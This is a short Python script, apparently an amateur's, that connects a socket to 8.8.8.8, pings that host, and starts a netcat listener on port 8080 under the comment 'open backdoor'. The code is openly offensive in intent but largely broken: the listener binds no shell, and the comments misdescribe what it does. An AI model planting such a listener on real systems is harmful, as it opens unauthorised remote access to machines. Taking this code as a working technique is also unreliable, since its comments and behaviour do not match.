import socket
import subprocess

# R4c0d3 @Author
# Create socket
s = socket.socket()

# connect with your remote IP
host = "8.8.8.8"
port = 80

s.connect((host, port))

# send ping of connection
ping = subprocess.Popen(["ping", "-c", "2", "-W", "2", host],
                        stdout=subprocess.PIPE).communicate()[0]
# show ping
print(ping)

# open backdoor
subprocess.Popen(["nc", "-l", "-p", "8080"], stdout=subprocess.PIPE)

# close socket
s.close()

